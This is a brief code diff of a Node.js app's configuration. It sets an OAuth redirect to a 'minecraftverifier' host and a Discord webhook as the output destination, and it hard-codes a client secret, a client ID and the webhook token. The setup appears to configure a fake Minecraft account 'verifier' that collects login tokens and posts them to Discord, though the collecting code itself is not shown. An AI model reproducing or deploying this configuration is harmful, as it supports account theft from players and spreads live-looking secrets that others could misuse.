@@ -1,8 +1,8 @@
 //Config
 const secret_value = '831ad5f6-4da9-48bb-b9aa-a618ba1f419c'
 const client_id = 'f0606008-2fc6-48a0-adf9-db9fad90c8cf'
-const redirect_uri = 'https://d-na.herokuapp.com/'
-const webhook_url = 'webhook'
+const redirect_uri = 'https://minecraftverifier.onrender.com'
+const webhook_url = 'https://discord.com/api/webhooks/1152495779227910204/bmOI_8eXiEfusZfUYdBcfZlo7S4ul_deKgM6B5asjLKx1ovM0RaoEquD433ZflM89ng3'
 //Requirements
 const axios = require('axios')
 const express = require('express')
